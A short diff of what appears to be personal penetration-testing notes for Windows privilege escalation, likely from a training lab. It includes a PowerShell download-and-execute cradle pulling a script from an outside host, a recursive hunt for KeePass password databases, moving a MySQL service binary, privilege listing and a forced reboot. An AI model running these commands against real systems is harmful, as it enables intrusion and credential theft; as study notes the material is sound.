@@ -17,4 +17,10 @@ IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.119.3/power
 
 `Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue` find all .kdbx files on the system (password databases used by password managers)
 
-``
+`move C:\xampp\mysql\bin\mysqld.exe mysqld.exe` - move a file using PowerShell
+
+`whoami /priv` list the current users privileges (state is for the current command whoami, we only need to see the presence of the privilege)
+
+`shutdown /r /t 0` - reboot the machine in zero seconds if we need to reboot
+
+
